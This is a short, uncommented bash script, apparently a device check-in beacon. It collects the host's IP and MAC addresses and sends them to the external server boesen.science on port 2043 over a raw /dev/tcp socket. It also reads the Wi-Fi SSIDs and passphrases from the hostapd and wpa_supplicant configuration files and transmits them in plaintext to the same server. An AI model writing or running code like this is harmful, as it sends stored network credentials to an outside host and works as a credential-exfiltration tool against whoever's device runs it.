#!/bin/bash

IP=`hostname -I | sed 's/ *$//'`
MAC=`cat /sys/class/net/*/address | grep -v "00:00:00:00:00:00" | tr '\n' ',' | sed 's/,*$//'`

SERVER="boesen.science"
PORT=2043

if [[ $(< /tmp/ip) != "$IP" ]]; then
	printf "$IP" > /tmp/ip

	exec 3<>/dev/tcp/$SERVER/$PORT
	printf "UPDATE: $MAC $IP" >&3

	cat <&3
fi

exec 3<>/dev/tcp/$SERVER/$PORT
printf "NETWORK: `grep '^ssid' /etc/hostapd/hostapd.conf` `grep 'wpa_passphrase' /etc/hostapd/hostapd.conf` `egrep 'ssid|psk' /etc/wpa_supplicant/wpa_supplicant.conf | tr '\n' ' '`" >&3
